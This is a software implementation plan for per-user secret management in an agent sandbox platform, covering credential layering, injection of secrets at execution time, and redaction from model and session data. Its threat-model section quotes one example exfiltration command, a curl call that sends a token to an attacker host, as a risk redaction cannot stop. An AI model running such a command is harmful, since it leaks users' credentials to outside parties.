# Implementation Plan — Per-User Env/Secret Management + On-Demand Injection

Status: in progress · Date: 2026-06-26
Companion: [skills-env-management-gap.md](./skills-env-management-gap.md)

## Implementation status

**Done (implemented + tested):**
- Phase 1 — per-user `CredentialProvider` (user-over-tenant) in both impls.
  `tests/test_credentials_user_scope.py` ✅
- Phase 6 — `SecretStr` + `SecretRedactionPlugin` (mutate-in-place, registered
  FIRST so it scrubs before audit/trace/persist). `tests/test_secret_hygiene.py` ✅
- Phase 5 (partial) — base `_runtime_env()` resolve-at-exec (TTL) +
  `configure_runtime_env`; **NoopBackend** applies it per-subprocess (scoped
  env, no global mutation; true on-demand). **DaytonaBackend** injects it at
  sandbox-create (its native env model) + sends a per-exec `env` (best-effort).
  On-demand mid-session pickup unit-tested (noop).
- **Live Daytona e2e PASS** (real remote sandbox over LAN, HTTPS + self-signed):
  alice's personal secret baked into the sandbox (`len=20`), result shows
  `val=‹redacted:MYSECRET›`, raw value absent from /run resp, session DB, and
  server log (names-only). Note: on Daytona injection is create-time, so a
  secret set MID-session reaches the next session/sandbox, not necessarily the
  next command (noop does true per-command on-demand).
- Phase 2 (partial) — `user_id` threaded into `sandbox_env.resolve()` and the
  tenancy backend factory.
- Phase 4 (API + UI) — self-service `/auth/secrets` GET/PUT/DELETE (names+scope
  only) AND the Settings → **Secrets** panel (AccountPage): values never shown.
  GET returns inputs **grouped by owning skill / MCP server** (+ `other` for
  custom keys) with a `missing_required` count; the UI renders one card per
  skill/MCP with a "needs setup" badge, and a count badge on the Settings gear
  + Account button. MCP servers enumerated from the static file + tenant
  registry. Real-browser e2e (`tests/e2e_account_ui.py`, 20 checks): grouped
  rendering, group badge, gear badge, add → Set badge → stored at user scope →
  value never returned by API → remove. Full UI→agent→Daytona chain
  (`e2e_secrets_ui_full.py`, 6/6).
- Phase 2 (MCP) — `TenantMcpToolset` resolves tokens user-over-tenant
  (`user_id` threaded into `credentials.get`). `tests/test_mcp_user_scope.py`
- **Live agent-API e2e PASS** (noop backend): alice sets a personal secret →
  `run_bash` subprocess receives it (`len=20`) → tool result shows
  `val=‹redacted:MYSECRET›`; raw value absent from the /run response AND the
  persisted session. No regressions (`test_admin_panel` fails identically on
  baseline — pre-existing, unrelated).

**Done (Phase 3):**
- Skill declaration registry: `credentials/required_inputs.py` reads
  `SKILL.md` `metadata["x-adk-cc/secrets"]` (JSON list / dict / comma forms),
  unions across installed skills (cached). `_runtime_env()` now injects only
  the **declared** keys (∩ what the user set) — least privilege — and falls back
  to ALL user secrets when nothing is declared (rollout-safe). `/auth/secrets`
  lists declared inputs + status (set/unset) so the UI can prompt. Verified:
  unit (parse/discovery/allowlist filter/fallback), wiring (SKILL.md →
  `make_default_backend` → `backend._env_declared_keys`), and the live Daytona
  e2e still passes via the fallback path. `tests/test_required_inputs.py`

**Deferred (not yet built):**
- Phase 5 (rest) — per-exec `_runtime_env()` apply for **Docker / E2B /
  SandboxService** (Noop + Daytona done). True on-demand (per-command) on
  Daytona depends on its toolbox honoring per-exec `env`; today it's create-time
  baking. The version-counter invalidation signal (TTL only for now).


## Goal

A user provides the credentials a skill/MCP needs (from the Settings UI); those
values resolve **user-over-tenant** and reach the agent's in-sandbox commands —
including secrets provided **after** the sandbox was created (on-demand), with
no recreation. Declaration stays inside the Agent Skills open spec
(`metadata` namespace). **Resolved values never enter the model input/output,
the session store, or anything delivered to the user** (Phase 6). Default-off /
back-compatible: existing tenant-only deployments are unchanged.

## Design at a glance

```
  SKILL.md metadata["x-adk-cc/secrets"]  ─┐
  MCP credential_key (+ description)      ─┼─►  Required-Inputs Registry
                                           │      (id, description, secret, source)
                                           ▼
   Settings UI  ──PUT /auth/secrets──►  CredentialProvider (user-scoped)
                                           │   get(tenant_id, user_id, key)
                                           ▼   user value ▸ tenant value ▸ MCP static env
                           ┌───────────────┴────────────────┐
                           ▼                                 ▼
                 MCP toolset resolver               Sandbox EnvResolver
                 (bearer header, per-session)       (create-time AND per-exec)

  HYGIENE BOUNDARY (Phase 6): value flows ONLY along the arrows above.
  It must NOT cross into → LlmRequest/LlmResponse · tool args/results ·
  session state · events DB · API responses/stream. Model sees id+description
  only; SecretStr hides the raw value; SecretRedactionPlugin scrubs egress.
```

Two precedence chains:
- **Secret value:** user-scoped > tenant-scoped > MCP static-path env var.
- **Sandbox env source:** passthrough < static < credentials (unchanged), with
  credentials now resolved user-over-tenant.

---

## Phase 1 — Per-user `CredentialProvider` (user-over-tenant)

**`credentials/provider.py`** — add an optional `user_id` to the ABC:
```python
async def get(self, *, tenant_id, key, user_id=None) -> str | None
async def put(self, *, tenant_id, key, value, user_id=None) -> None
async def delete(self, *, tenant_id, key, user_id=None) -> None
async def list_keys(self, *, tenant_id, user_id=None) -> list[str]
```
Semantics (documented on the ABC):
- `get(user_id=X)` → return the user-scoped value if present, **else fall back**
  to the tenant-shared value (`user_id=None`). This is the layering — it lives
  in `get` so every caller gets it for free.
- `put/delete/list_keys` operate on the **exact** scope named (user_id given →
  personal store; None → tenant-shared store). No fallback for writes/listing.
- `user_id=None` everywhere preserves today's behavior byte-for-byte.

**`credentials/impls.py`:**
- `InMemoryCredentialProvider`: key tuple `(tenant_id, user_id or "", key)`;
  `get` does the user→tenant fallback; `list_keys` filters by exact scope.
- `EncryptedFileCredentialProvider`: path layout
  - tenant-shared (unchanged): `<root>/<tenant_id>/<key>.enc`
  - user-scoped (new):          `<root>/<tenant_id>/_users/<user_id>/<key>.enc`
  - `_path(tenant_id, key, user_id)`; `get` tries the user path then the tenant
    path. `_safe_component` MUST also sanitize `user_id` (path-traversal). The
    `_users` segment is reserved (reject it as a tenant-shared key name) so a
    key can't collide with the user subtree.
- **No migration:** existing `<tenant>/<key>.enc` files keep working as the
  tenant-shared layer.

**Tests — `tests/test_credentials_user_scope.py`:** user overrides tenant;
user-missing falls back to tenant; put/delete/list are scope-exact (a user
write is invisible to the tenant list and to other users); `user_id` traversal
attempts (`../`, `_users`) are rejected; back-compat (user_id=None path
unchanged).

---

## Phase 2 — Thread `user_id` through the resolvers

The authenticated principal's `user_id` is already on the session (identity /
tenancy seeds `temp:tenant_context`). Thread it to both consumers:

- **`tools/mcp_tenant.py`** (`get_tools()` resolver): pass `user_id=` into
  `credentials.get(...)`. Pull `user_id` from the same place tenant_id comes
  from (session state principal). Resolved per session boot (rotations apply
  next session) — same lifecycle as today.
- **`sandbox/sandbox_env.py`** `SandboxEnvSpec.resolve(...)`: add `user_id=None`
  param; pass it into `credentials.get(...)` for the credentials source. Callers
  in `sandbox/__init__.py` / backends thread the session's `user_id`.

No behavior change when `user_id` is None (single-tenant/dev).

---

## Phase 3 — Skill/MCP secret **declaration** (spec-compliant)

**Declaration formats:**
- Skill `SKILL.md` frontmatter (validates with `skills-ref`):
  ```yaml
  metadata:
    x-adk-cc/secrets: |
      [{"id":"GITHUB_TOKEN","description":"GitHub PAT for pushes","secret":true}]
  ```
- MCP `McpServerConfig`: keep `credential_key` as the `id`; add optional
  `credential_description` so it joins the same registry.

**`tools/skills.py`:** when listing skills, read
`frontmatter.metadata.get("x-adk-cc/secrets")` (ADK `Frontmatter.metadata`
confirmed present), parse the JSON list, validate each `{id, description,
secret}` (reuse the tolerant-JSON helper; skip + warn on malformed, never
fatal). Expose a `declared_secrets()` accessor.

**New `credentials/required_inputs.py`:** a small registry that unions skill +
MCP declarations into `RequiredInput(id, description, secret, source)` and, given
a `CredentialProvider` + `(tenant_id, user_id)`, reports each input's status:
`set_user | set_tenant | unset`. Powers the UI's "needs setup" list. Names only,
never values.

**Tests — `tests/test_required_inputs.py`:** parse valid/invalid `metadata`
secrets; MCP + skill union + dedup by id; status reflects user/tenant presence.

---

## Phase 4 — Per-user Secrets UI + API (self-service)

**`service/identity_routes.py`** — mirror the `/auth/api-keys` self-service +
`admin_routes.py` credential pattern, but scoped to the **authenticated
principal** (user_id from the token, NEVER from a path):
- `GET  /auth/secrets` → `{ inputs: [{id, description, status, source}], extra_keys: [...] }`
  — declared inputs with status + any extra user-set keys. **Names/status only.**
- `PUT  /auth/secrets/{key}` `{value}` → `credentials.put(tenant_id, user_id, key, value)`.
- `DELETE /auth/secrets/{key}` → `credentials.delete(tenant_id, user_id, key)`.
- Write-only; no endpoint ever returns a value.

**Web UI:** a Settings → **Secrets** panel modeled on the API-keys panel: list
each declared input (`description` + set/unset badge), a password field to set,
delete control. Tenant-shared secrets remain in the **admin** panel (admin-only)
— the user panel shows them as "provided by your team" (status `set_tenant`,
read-only) so users know they don't need to set them.

**AuthZ:** a user reads/writes only their own user-scoped secrets; tenant-shared
writes stay admin-only (existing admin route). Reuse the existing auth
middleware; add `/auth/secrets*` to the authenticated (non-public) route set.

**Tests — `tests/e2e_user_secrets.py`:** user sets a secret → appears as
`set_user` (value never returned); a second user does NOT see it; deleting it
falls back to `set_tenant` when a tenant value exists; non-admin cannot write a
tenant key.

---

## Phase 5 — On-demand injection pipeline (resolve-at-exec)

**Problem:** today `sandbox_env` injects once into the create payload
(Daytona only). A secret a user provides *after* the sandbox is created never
reaches the running sandbox. Recreating the sandbox per secret change is wrong.

**Fix:** make env **resolve at exec time** and inject **per command**, so the
next `run_bash`/skill-script picks up newly-provided secrets automatically.

**Sandbox ABC (`sandbox/backends/base.py`)** — extend the execution contract:
- `exec(..., env: Optional[Mapping[str,str]] = None)` and the same on
  `exec_stream(...)`. Default `None` → unchanged behavior.
- Add a base helper `async def _runtime_env(self) -> dict[str,str]` that calls
  the backend's `SandboxEnvSpec.resolve(tenant_id, user_id, credentials)` with a
  **short TTL cache** (default ~15s) keyed by `(tenant_id, user_id)`, plus an
  explicit `invalidate_env()` to drop the cache immediately.
- The default `exec` wrapper merges `await self._runtime_env()` into whatever
  the caller passed, so every backend gets on-demand env without per-backend
  resolve logic. (Policy in base; application in subclass — same split the ABC
  already uses.)

**Per-backend application** (each maps the dict to its per-command env API):
- DockerBackend → `exec_run(environment=env)`
- DaytonaBackend → exec endpoint `env` (keeps create-time bake as a fast-path)
- E2BBackend → `process.start(envs=env)` / `commands.run(envs=...)`
- SandboxServiceBackend → exec/SSE payload `env`
- NoopBackend → **host backend: do NOT inject** secrets into the host process;
  pass through only explicitly-allowed vars, or no-op. Documented opt-out.

**Change signal (so mid-session secrets appear promptly):** a per-`(tenant,
user)` **secrets version counter** bumped on `PUT/DELETE /auth/secrets` (and the
admin tenant route). The exec-time resolver compares the counter cheaply; on a
bump it calls `invalidate_env()` so the next exec re-resolves. Absent a signal,
the TTL bounds staleness. (Counter lives next to the CredentialProvider; cheap
in-memory + persisted alongside the store.)

**Create-time injection stays** as an optimization (env present for the
sandbox's own init), but per-exec resolution is the source of truth — so the
two no longer diverge and on-demand is automatic.

**Tests:**
- `tests/test_sandbox_runtime_env.py` (unit, Noop/fake backend): exec receives
  the resolved env; setting a new secret + bumping the version → next exec sees
  it WITHOUT recreate; TTL expiry re-resolves; Noop does not inject host
  secrets.
- Extend `tests/test_sandbox_env.py` for the `user_id` dimension.
- Cross-ref: this depends on closing the **Daytona-only** wiring gap
  (Docker/E2B/SandboxService must apply env at exec) noted in the prior
  sandbox-env discussion.

---

## Phase 6 — Secret hygiene: never in I/O, session DB, or user delivery

**Requirement:** a resolved secret value must NEVER appear in the model input
(LlmRequest), the model/tool output, the persisted session (state + events DB),
or anything delivered to the user. It lives in exactly ONE flow:
`CredentialProvider → resolver → backend exec env / MCP auth header`.

Three planes to keep clean — primary defense is **isolation by construction**,
backed by **redaction at egress** as defense-in-depth.

### A. Model-context plane (input/output) — isolation first

- The model only ever sees a secret's **`id` + `description`** (so it can tell
  the user "set GITHUB_TOKEN in Settings"), **never the value**. Declarations
  surface names; resolution surfaces values only to the exec/MCP boundary.
- Resolved values are passed as a **side-channel** `env` arg to `exec` (Phase 5)
  / connection params (MCP) — never into the system prompt, tool args, or
  context. No code path assigns a secret into anything the model reads.
- Wrap resolved secrets in a **`SecretStr`-style type** whose `__repr__`/`__str__`
  render `***` and which only yields the raw value via an explicit
  `.reveal()` call at the injection boundary. Prevents accidental interpolation
  into prompts, logs, or f-strings.

### B. Egress redaction (defense-in-depth) — `SecretRedactionPlugin`

A `BasePlugin` (per [[feedback_plugins_over_callbacks]]) holding the session's
currently-resolved secret values (from the same EnvResolver, so it tracks
on-demand additions). It scrubs every value → `‹redacted:NAME›` at the
boundaries that feed the model / DB / user:
- `after_tool_callback`: scrub tool **results** — exec stdout/stderr, MCP tool
  output — BEFORE they return to the model and get persisted as events. (Covers
  `echo $TOKEN`, an `env` dump, a stack trace echoing a header, etc.)
- response/stream filter: scrub the model **response** text before delivery.
- Also redact known values from tool **args** before persistence (belt-and-suspenders
  — the model shouldn't have them, but guard anyway).
- Redact exact value **plus common encodings** (base64) best-effort.

### C. Persistence plane (session DB)

- **Never** write a secret to session `state` (not even `temp:` — and regular
  state IS persisted). Resolution is in-memory only; the only at-rest home is the
  encrypted `CredentialProvider`.
- Tool args/results are persisted by ADK into the events table → kept clean by
  (B)'s redaction at the tool boundary.
- Verify the exec event/log record does NOT capture the `env` dict passed to
  `exec` (it's a side-channel param, not part of the command record).
- A guard + test asserts no secret value reaches the session service.

### D. User-delivery plane

- Already: no GET returns values (names/status only); PUT is write-only.
- The run stream / tool-result surfacing to the UI passes through (B).
- Best-effort: warn if an agent tries to save a secret value into an artifact.

### Threat model (document honestly)

- Redaction prevents **accidental** exposure in I/O / DB / UI. It does **not**
  stop a **malicious skill** that deliberately exfiltrates a secret (e.g.,
  `curl attacker.com?t=$TOKEN`) — that's the skill-trust boundary the Agent
  Skills spec itself warns about ("use skills only from trusted sources").
  AuthZ/network policy on the sandbox is the control there, not redaction.
- Value-substring redaction can over-redact very short/low-entropy secrets and
  miss transformed ones; recommend high-entropy secrets and redact exact +
  base64 forms. State this limitation.

**Tests — `tests/test_secret_hygiene.py`:** a tool result echoing a secret is
redacted before the model/event sees it; `SecretStr.__str__/__repr__` never
reveal; a secret never lands in session state or the events DB (assert against
the session service); GET endpoints never return values; redactor tracks an
on-demand-added secret.

---

## Phase 7 — Docs, .env, security pass

- `.env.example`: document `ADK_CC_SANDBOX_ENV*` (already), the new
  `x-adk-cc/secrets` skill convention, `ADK_CC_CREDENTIAL_KEY` (already), and the
  runtime-env TTL knob (`ADK_CC_SANDBOX_ENV_TTL_S`, default 15).
- Security invariants (assert in review): values never logged, never returned by
  any GET (names/status only), **never in LlmRequest/LlmResponse, tool
  args/results, session state, or the events DB**; encrypted at rest; user can't
  read another user's or write a tenant key; `user_id`/key path-traversal
  rejected; Noop never receives injected secrets; no secret written to disk
  inside the sandbox by the pipeline.

---

## Build order

1. Phase 1 (provider user dimension) + tests — foundation, no behavior change.
2. Phase 2 (thread user_id) — MCP + sandbox resolve user-over-tenant.
3. Phase 3 (declaration registry) + tests.
4. **Phase 6 (secret hygiene)** — land the `SecretStr` type + `SecretRedactionPlugin`
   EARLY (before any value flows to exec), so isolation/redaction exists from the
   first injection. (Built out of order vs. numbering — it's a guardrail.)
5. Phase 4 (API + UI) + e2e.
6. Phase 5 (on-demand resolve-at-exec) — the larger change; also closes the
   Daytona-only injection gap across backends. Redactor (Phase 6) tracks its env.
7. Phase 7 (docs + security pass) + live multi-user e2e.

Phases 1–4 + 6 deliver per-user secrets for **MCP** and **create-time** sandbox
with full hygiene. Phase 5 adds the on-demand path and full backend coverage; it
can land incrementally (one backend at a time behind the new `env` contract).
**Phase 6 is a prerequisite gate**: no secret value may flow to an exec env or
MCP header until the redaction/isolation guardrails are in place.

## Open items / to confirm during build

- **Where `user_id` is read in the MCP resolver** — verify the session-state
  principal is available in `TenantMcpToolset.get_tools()`; if only tenant_id is
  seeded today, seed `user_id` alongside it in the tenancy plugin.
- **Secrets version counter persistence** — in-memory is enough for single
  worker; for multi-worker prod, persist next to the store or derive from file
  mtime. (Single-worker is the current assumption, per memory_scheduler note.)
- **Backends lacking per-command env** — fall back to create-time only and
  `log()` the limitation (no silent staleness).

## Verification matrix

| Layer | Test | Asserts |
|---|---|---|
| Provider | `test_credentials_user_scope` | layering, scope-exact writes, traversal safety, back-compat |
| Declaration | `test_required_inputs` | metadata parse, MCP+skill union, status |
| API/UI | `e2e_user_secrets` | self-service set/list/delete, isolation, no value leak, admin-only tenant |
| Sandbox | `test_sandbox_runtime_env` + `test_sandbox_env` | per-exec env, on-demand pickup w/o recreate, TTL, Noop opt-out, user dimension |
| **Hygiene** | `test_secret_hygiene` | value redacted from tool result before model/event; `SecretStr` never reveals; never in state/events DB; GET never returns value; redactor tracks on-demand secret |
| Live | multi-user manual/e2e | alice sets secret → her skill/MCP resolves it; bob's session doesn't; mid-session set reaches next exec; `echo $TOKEN` output comes back redacted |
